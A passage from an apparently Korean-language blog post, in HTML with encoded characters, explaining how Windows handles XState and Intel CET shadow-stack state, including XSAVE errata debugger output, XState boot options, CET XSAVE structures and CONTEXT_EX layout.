&#xD3EC;&#xD568;&#xD55C;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xD14C;&#xC2A4;&#xD2B8; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC704;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; &#xC5D0;&#xB77C;&#xD0C0;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs c">dx -r3 @$errata = (XSAVE_CPU_ERRATA*)((<span class="hljs-keyword">int</span>)@$vendor-&gt;Vendor[<span class="hljs-number">0</span>].SupportedCpu.CpuErrata + <span class="hljs-number">0x253d0e90000</span>)    [+<span class="hljs-number">0x000</span>] NumberOfErrata   : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x008</span>] Errata           [Type: XSAVE_CPU_INFO [<span class="hljs-number">1</span>]]        [<span class="hljs-number">0</span>]              [Type: XSAVE_CPU_INFO]            [+<span class="hljs-number">0x000</span>] Processor        : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>]            [+<span class="hljs-number">0x002</span>] Family           : <span class="hljs-number">0x6</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x004</span>] Model            : <span class="hljs-number">0xf</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x006</span>] Stepping         : <span class="hljs-number">0xb</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x008</span>] ExtendedModel    : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x00c</span>] ExtendedFamily   : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [+<span class="hljs-number">0x010</span>] MicrocodeVersion : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]            [+<span class="hljs-number">0x018</span>] Reserved         : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]</code></pre><p>&#xBAA8;&#xB4E0; XState &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC815;&#xCC45; &#xB364;&#xD504; &#xD234;&#xC740; <a href="https://github.com/yardenshafir/cet-research/tree/master/Xpolicy">&#xC5EC;&#xAE30;</a>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC9C0;&#xAE08;&#xC740; &#xC804;&#xCCB4; &#xC815;&#xCC45;(&#xC704;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; &#xAC83;)&#xC5D0; &#xD558;&#xB098;&#xC758; &#xC5D0;&#xB77C;&#xD0C0;&#xB9CC; &#xB098;&#xD0C0;&#xB09C;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xB2E4;&#xC74C; &#xC635;&#xC158; &#xB85C;&#xB354; &#xBA85;&#xB839;&#xC904; &#xC635;&#xC158;(&#xBC0F; &#xAC01; BCD &#xC124;&#xC815;)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; XState &#xAE30;&#xB2A5;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><ol><li><code>XSAVEPOLICY = n</code> &#xB85C;&#xB4DC; &#xC635;&#xC158;&#xC740; <code>xsavepolicy</code> BCD &#xC635;&#xC158;&#xC744; &#xD1B5;&#xD574; &#xC124;&#xC815;&#xB418;&#xBA70; <code>KeXSavePolicyId</code>&#xB97C; &#xC124;&#xC815;&#xD558;&#xC5EC; &#xB85C;&#xB4DC;&#xD560; XState &#xC815;&#xCC45;&#xC744; &#xB098;&#xD0C0;&#xB0B8;&#xB2E4;.</li><li><code>XSAVEREMOVEFEATURE = n</code>&#xB85C;&#xB4DC; &#xC635;&#xC158;&#xC740; <code>xsaveremovefeature</code> BCD&#xC635;&#xC158;&#xC744; &#xD1B5;&#xD574; &#xC124;&#xC815;&#xB418;&#xBA70; <code>KeTestRemovedFeatureMask</code> &#xB97C; &#xC124;&#xC815;&#xD55C;&#xB2E4;. &#xC774;&#xB294; &#xB098;&#xC911;&#xC5D0; <code>KiInitializeXSave</code>&#xC5D0; &#xC758;&#xD574; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xB418;&#xACE0; &#xC9C0;&#xC815;&#xB41C; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xB97C; &#xC81C;&#xAC70;&#xD55C;&#xB2E4;. &#xC0C1;&#xD0DC; 0 (x87 FPU) &#xBC0F; &#xC0C1;&#xD0DC; 1 (SSE)&#xC740; &#xC774; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC81C;&#xAC70;&#xD560; &#xC218; &#xC5C6;&#xB2E4;.</li><li><code>XSAVEDISABLE</code> &#xB85C;&#xB4DC; &#xC635;&#xC158;&#xC740; <code>xsavedisable</code> BCD &#xC635;&#xC158;&#xC744; &#xD1B5;&#xD574; &#xC124;&#xC815;&#xB418;&#xC5B4; <code>KeTestDisableXsave</code>&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; <code>KiInitializeXSave</code>&#xAC00; &#xBAA8;&#xB4E0; XState &#xAD6C;&#xC131; &#xB370;&#xC774;&#xD130;&#xB97C; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC5EC; &#xC804;&#xCCB4; XState &#xAE30;&#xB2A5;&#xC744; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD55C;&#xB2E4;.</li></ol><h2 id="CET-XSAVE-&#xC601;&#xC5ED;-&#xD3EC;&#xB9F7;"><a href="#CET-XSAVE-&#xC601;&#xC5ED;-&#xD3EC;&#xB9F7;" class="headerlink" title="CET XSAVE &#xC601;&#xC5ED; &#xD3EC;&#xB9F7;"></a>CET XSAVE &#xC601;&#xC5ED; &#xD3EC;&#xB9F7;</h2><p>CET &#xAD6C;&#xD604;&#xC758; &#xC77C;&#xD658;&#xC73C;&#xB85C; Intel&#xC740; <code>XSTATE_CET_U(11)</code>&#xC640; <code>XSTATE_CET_S(12)</code>&#xB77C;&#xACE0; &#xD558;&#xB294; &#xB450; &#xAC1C;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xBE44;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xC790; &#xBC0F; &#xC288;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xC0C1;&#xD0DC;&#xC5D0; &#xAC01;&#xAC01; &#xB300;&#xC751;&#xD558;&#xB3C4;&#xB85D; &#xC815;&#xC758;&#xD588;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xC0C1;&#xD0DC;&#xB294; <code>XSAVE_CET_U_FORMAT</code>&#xC73C;&#xB85C; &#xBB38;&#xC11C;&#xD654;&#xB41C; 16&#xBC14;&#xC774;&#xD2B8; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xB85C;, <code>IA32_U_CET</code> MSR(<code>Shadow Stack Enable</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xAD6C;&#xC131;&#xB41C; &#xACBD;&#xC6B0;) &#xBC0F; <code>IA32_PL3_SSPMSR</code> (Privile 3 &#xC218;&#xC900;)&#xC744; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;. &#xC544;&#xC9C1; MSDN &#xC815;&#xC758;&#xAC00; &#xC5C6;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xBC29;&#xBC95;&#xC740; <code>IA32_PL0/1/2_SSP</code> MSR&#xC744; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_CET_U_FORMAT</span></span><span class="hljs-class">{</span>    ULONG64 Ia32CetUMsr;    ULONG64 Ia32Pl3SspMsr;} XSAVE_CET_U_FORMAT, *PXSAVE_CET_U_FORMAT;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_CET_S_FORMAT</span></span><span class="hljs-class">{</span>    ULONG64 Ia32Pl0SspMsr;    ULONG64 Ia32Pl1SspMsr;    ULONG64 Ia32Pl2SspMsr;} XSAVE_CET_S_FORMAT, *PXSAVE_CET_S_FORMAT;</code></pre><p>&#xD544;&#xB4DC; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; CET &#xAD00;&#xB828; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xAC01; MSR&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xAC12;&#xC774;&#xBA70;, &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; Ring 0&#xC758; RDMSR &#xBC0F; WRMSR &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574;&#xC11C;&#xB9CC; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC804;&#xC5ED; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; MSR&#xACFC; &#xB2EC;&#xB9AC; CET&#xB294; &#xC2A4;&#xB808;&#xB4DC; &#xB2E8;&#xC704;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; Shadow stack pointer&#xB3C4; &#xC2A4;&#xB808;&#xB4DC; &#xB2E8;&#xC704;&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC774;&#xC720;&#xB85C; CET &#xAD00;&#xB828; &#xB370;&#xC774;&#xD130;&#xB294; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xAC00; &#xC2A4;&#xB808;&#xB4DC; &#xC2A4;&#xC704;&#xCE58;&#xB97C; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; XState &#xAE30;&#xB2A5;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</p><p>CET &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xB85C;&#xB9CC; &#xC218;&#xC815; &#xAC00;&#xB2A5;&#xD55C; MSR&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>CPL3 XSAVE/XRSTOR</code> &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBA70; &#xAC01;&#xAC01;&#xC758; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xB294; <code>IA32_XSS</code> MSR&#xC5D0;&#xC11C; &#xD56D;&#xC0C1; 1&#xB85C; &#xC124;&#xC815;&#xB41C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xAC00; &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC758; &#xCF54;&#xB4DC;&#xAC00; SSP&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC644;&#xC804;&#xD788; &#xCC28;&#xB2E8;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xB2E4;. &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC758; &#xCF54;&#xB4DC;&#xB294; &#xC608;&#xC678; &#xCC98;&#xB9AC;, unwinding, jmp/longjmp &#xB610;&#xB294; Windows&#xC758; <code>Fiber</code> &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xACFC; &#xAC19;&#xC740; &#xD2B9;&#xC815; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD574; SSP&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; Windows&#xAC00; CS &#xBC0F; DR7&#xACFC; &#xAC19;&#xC740; &#xD2B9;&#xC815; &#xBCF4;&#xD638;&#xB41C; CPU &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC73C;&#xB85C; <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext</a>&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xB294; &#xC2A4;&#xB808;&#xB4DC;&#xAC00; &#xC2DC;&#xC2A4;&#xD15C; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; XSate&#xC5D0;&#xC11C; CET &#xC0C1;&#xD0DC;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC81C;&#xACF5;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC5D0;&#xC11C;&#xB294; XState &#xAD00;&#xB828; &#xC815;&#xBCF4;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD604;&#xB300;&#xC758; Windows &#xBC84;&#xC804;&#xC5D0;&#xC11C; <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-wow64_context">CONTEXT</a> &#xAD6C;&#xC870;&#xAC00; CONTEXT_EX &#xAD6C;&#xC870;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC1C;&#xC804;&#xD588;&#xB294;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; &#xC608;&#xC678; &#xAD00;&#xB828; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0; &#xB300;&#xD574; CET &#xAD00;&#xB828; &#xCC98;&#xB9AC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; &#xC190;&#xC0C1;&#xB41C; CONTEXT&#xB97C; &#xD1B5;&#xD55C; &#xC545;&#xC758;&#xC801;&#xC778; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF8;&#xB2E4;.</p><h1 id="CONTEXT-EX-&#xB0B4;&#xBD80;"><a href="#CONTEXT-EX-&#xB0B4;&#xBD80;" class="headerlink" title="CONTEXT_EX &#xB0B4;&#xBD80;"></a>CONTEXT_EX &#xB0B4;&#xBD80;</h1><p>&#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xC2A4;&#xC704;&#xCE58;&#xB97C; &#xD560; &#xB54C; &#xC800;&#xC7A5;&#xD574;&#xC57C; &#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xC218;&#xAC00; &#xC810;&#xC810; &#xB298;&#xC5B4;&#xB098;&#xACE0;, &#xC774;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xBC84;&#xC804;&#xC758; Windows&#xB294; &#xB808;&#xAC70;&#xC2DC; CONTEXT &#xAD6C;&#xC870; &#xC678;&#xC5D0;&#xB3C4; CONTEXT_EX &#xAD6C;&#xC870;&#xB97C; &#xB3C4;&#xC785;&#xD588;&#xB2E4;. CONTEXT_EX&#xB294; &#xB808;&#xAC70;&#xC2DC; CONTEXT&#xAC00; &#xACE0;&#xC815; &#xD06C;&#xAE30;&#xC778; &#xBC18;&#xBA74; XSAVE&#xB294; &#xC2A4;&#xB808;&#xB4DC;, &#xD504;&#xB85C;&#xC138;&#xC11C; &#xBC0F; &#xC2DC;&#xC2A4;&#xD15C; &#xAD6C;&#xC131; &#xC815;&#xCC45;&#xC5D0; &#xB530;&#xB77C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD06C;&#xAE30;&#xAC00; &#xC870;&#xC815;&#xB418;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC0C1;&#xD0DC; &#xAD6C;&#xC870;&#xAC00; &#xD544;&#xC694;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xB2E4;.</p><h2 id="CONTEXT-EX-&#xAD6C;&#xC870;"><a href="#CONTEXT-EX-&#xAD6C;&#xC870;" class="headerlink" title="CONTEXT_EX &#xAD6C;&#xC870;"></a>CONTEXT_EX &#xAD6C;&#xC870;</h2><p>CONTEXT_EX&#xB294; &#xD604;&#xC7AC; &#xCEE4;&#xB110; &#xBC0F; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC608;&#xC678; &#xCC98;&#xB9AC; &#xAE30;&#xB2A5; &#xC804;&#xCCB4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0;&#xB9CC; CONTEXT_EX &#xAD6C;&#xC870;&#xC758; &#xB300;&#xBD80;&#xBD84;&#xC740; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. Windows 7 &#xD5E4;&#xB354; &#xD30C;&#xC77C; &#xBC0F; &#xC77C;&#xBD80; intel&#xC758; reference code&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC77C;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xC2E4;&#xC218;&#xB85C; &#xACF5;&#xAC1C;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD588;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;. &#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xC758; &#xC8FC;&#xC11D;&#xC744; &#xBCF4;&#xACE0; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC54C;&#xB824;&#xC8FC;&#xC5C8;&#xC73C;&#xBA74; &#xD55C;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">//</span><span class="hljs-comment">// &#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xB294; CONTEXT_EX&#xC758; &#xB2E8;&#xC77C; &#xCCAD;&#xD06C; &#xD06C;&#xAE30;&#xC640; &#xC624;&#xD504;&#xC14B;(CONTEXT_EX &#xAD6C;&#xC870; &#xC2DC;&#xC791;&#xBD80;&#xD130;)&#xC744; &#xC9C0;&#xC815;&#xD55C;&#xB2E4;.</span><span class="hljs-comment">// N.B. &#xC624;&#xD504;&#xC14B;&#xC740; &#xC74C;&#xC218;&#xC77C; &#xC218; &#xC788;&#xB2E4;.</span><span class="hljs-comment">//</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT_CHUNK</span></span><span class="hljs-class">{</span>    LONG Offset;    DWORD Length;} CONTEXT_CHUNK, *PCONTEXT_CHUNK;<span class="hljs-comment">// CONTEXT_EX &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xB294; CONTEXT &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xD655;&#xC7A5;&#xC774;&#xB2E4;. </span><span class="hljs-comment">// &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC0C1;&#xD0DC;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xBD84;&#xB9AC;&#xB41C; &#xAC00;&#xBCC0;&#xD06C;&#xAE30; &#xBC84;&#xD37C;(&#xCCAD;&#xD06C;) &#xC138;&#xD2B8;&#xB85C; </span><span class="hljs-comment">// &#xC815;&#xC758;&#xD55C;&#xB2E4;. &#xD604;&#xC7AC; &#xB450; &#xAC1C;&#xC758; &#xBC84;&#xD37C;(&#xCCAD;&#xD06C;)&#xB9CC; &#xC815;&#xC758;&#xB41C;&#xB2E4;:</span><span class="hljs-comment">//</span><span class="hljs-comment">// - &#xAE30;&#xC874; CONTEXT &#xAD6C;&#xC870;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB808;&#xAC70;&#xC2DC;</span><span class="hljs-comment">// - XSAVE &#xC800;&#xC7A5; &#xC601;&#xC5ED; &#xBC84;&#xD37C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; XState</span><span class="hljs-comment">// XSAVE_AREA_HEADER, i.e. without the first 512 bytes.</span><span class="hljs-comment">//</span><span class="hljs-comment">// PCONTEXT &#xD3EC;&#xC778;&#xD130;&#xB97C; PCONTEXT_EX &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xAC00;&#xC815;&#xC774; &#xC788;&#xB2E4;.</span><span class="hljs-comment">//</span><span class="hljs-comment">// 1. PCONTEXT &#xD3EC;&#xC778;&#xD130;&#xC640; &#xD568;&#xAED8; &#xC791;&#xB3D9;&#xD558;&#xB294; API&#xB294; CONTEXT_EX&#xAC00; CONTEXT &#xAD6C;&#xC870; &#xBC14;&#xB85C; &#xB4A4;&#xC5D0; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;</span><span class="hljs-comment">//    &#xB610;&#xD55C; CONTEXT_EX&#xB294; &#xD574;&#xB2F9; CONTEXT_XXX &#xD50C;&#xB798;&#xADF8;&#xAC00; CONTEXT.ContextFlags&#xC5D0; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;</span><span class="hljs-comment">//</span><span class="hljs-comment">// 2. CONTEXT_EX &#xAD6C;&#xC870;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xB808;&#xAC70;&#xC2DC;&#xAC00; &#xD56D;&#xC0C1; &#xC874;&#xC7AC;</span><span class="hljs-comment">//</span><span class="hljs-comment">// 3. CONTEXT.ContextFlags&#xB294; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xCCAD;&#xD06C;&#xB97C; &#xC815;&#xC758;</span><span class="hljs-comment">//    &#xC989; CONTEXT_XSTATE&#xAC00; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xC6B0; CONTEXT_EX.XState&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xB2E4;.</span><span class="hljs-comment">//</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT_EX</span></span><span class="hljs-class">{</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">// &#xC624;&#xD504;&#xC14B;&#xC774; &#xAC00;&#xC7A5; &#xC791;&#xC740; &#xCCAD;&#xD06C;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xCD1D; &#xD06C;&#xAE30;</span>    <span class="hljs-comment">// N.B. &#xC624;&#xD504;&#xC14B;&#xC740; &#xC74C;&#xC218;&#xC77C; &#xC218; &#xC788;&#xB2E4;.</span>    <span class="hljs-comment">//</span>    CONTEXT_CHUNK All;    <span class="hljs-comment">// </span>    <span class="hljs-comment">// &#xAE30;&#xC874;&#xC758; CONTEXT &#xAD6C;&#xC870; wrapper</span>    <span class="hljs-comment">// N.B. &#xCCAD;&#xD06C;&#xC758; &#xD06C;&#xAE30;&#xB294; sizeof(CONTEXT) &#xBCF4;&#xB2E4; &#xC791;&#xC744; &#xC218; &#xC788;&#xB2E4;.</span>    <span class="hljs-comment">// (CONTEXT_EXTENDED_REGISTERS&#xAC00; x86&#xC5D0; &#xC124;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0;).    </span><span class="hljs-comment">// CONTEXT_CHUNK Legacy;</span>    <span class="hljs-comment">//</span>  <span class="hljs-comment">// CONTEXT_XSTATE : &#xD655;&#xC7A5;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC0C1;&#xD0DC; &#xCCAD;&#xD06C;. &#xC0C1;&#xD0DC; &#xC800;&#xC7A5;&#xC740; &#xB3D9;&#xC77C;&#xD55C; &#xD615;&#xC2DD; </span>  <span class="hljs-comment">// XSAVE &#xC791;&#xC5C5;&#xC740; &#xCC98;&#xC74C; 512 &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC81C;&#xC678;&#xD558;&#xACE0; XSAVE_AREA_HEADER&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;. </span><span class="hljs-comment">// FP &#xBC0F; SSE &#xC0C1;&#xD0DC;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xD558;&#xC704; 2 &#xBE44;&#xD2B8;&#xB294; 0&#xC774;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</span>    <span class="hljs-comment">// CONTEXT_CHUNK XState;</span>} CONTEXT_EX, *PCONTEXT_EX;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CONTEXT_EX_LENGTH ALIGN_UP_BY(sizeof(CONTEXT_EX), STACK_ALIGN)</span><span class="hljs-comment">//</span><span class="hljs-comment">// &#xC774; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xCCAD;&#xD06C;&#xB97C; &#xB354; &#xC27D;&#xAC8C; &#xC870;&#xC791; &#xAC00;&#xB2A5;</span><span class="hljs-comment">//</span></code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xC774; &#xD5E4;&#xB354;&#xB85C; CONTEXT_EX &#xAD6C;&#xC870;&#xC758; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC744; &#xC774;&#xD574;&#xD558;&#xACE0; &#xC2DC;&#xAC01;&#xD654;&#xD560; &#xC218; &#xC788;&#xC744; &#xB54C;&#xAE4C;&#xC9C0; &#xC5EC;&#xB7EC; &#xCC28;&#xB840; &#xC2DC;&#xB3C4;&#xB97C; &#xD588;&#xACE0; &#xB2E4;&#xC74C; &#xB2E4;&#xC774;&#xC5B4;&#xADF8;&#xB7A8;&#xC774; &#xB3C4;&#xC6C0;&#xC774; &#xB420; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xB290;&#xAF08;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/4.png" alt></p><p>&#xB2E4;&#xC774;&#xC5B4;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; CONTEXT<em>EX &#xAD6C;&#xC870;&#xB294; &#xD56D;&#xC0C1; CONTEXT &#xAD6C;&#xC870;&#xC758; &#xB05D;&#xC5D0; &#xC788;&#xC73C;&#xBA70; &#xB808;&#xAC70;&#xC2DC; &#xBC0F; XState&#xB77C;&#xB294; <code>CONTEXT_CHUNK</code> &#xC720;&#xD615;&#xC758; 3&#xAC1C; &#xD544;&#xB4DC;&#xAC00; &#xC788;&#xB2E4;. &#xC774;&#xB4E4;&#xC740; &#xC624;&#xD504;&#xC14B;&#xACFC; &#xB370;&#xC774;&#xD130;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC815;&#xC758;&#xD558;&#xACE0; &#xC801;&#xC808;&#xD55C; &#xB370;&#xC774;&#xD130; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB2E4;&#xC591;&#xD55C; `RTL</em>` &#xB9E4;&#xD06C;&#xB85C;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;.</p><p>Legacy &#xD544;&#xB4DC;&#xB294; &#xAE30;&#xC874; CONTEXT &#xAD6C;&#xC870;&#xC758; &#xC2DC;&#xC791;&#xC744; &#xCC38;&#xC870;&#xD55C;&#xB2E4;. (<code>CONTEXT_EXTENDED_REGISTERS</code>&#xAC00; &#xC81C;&#xACF5;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; x86&#xC5D0;&#xC11C; 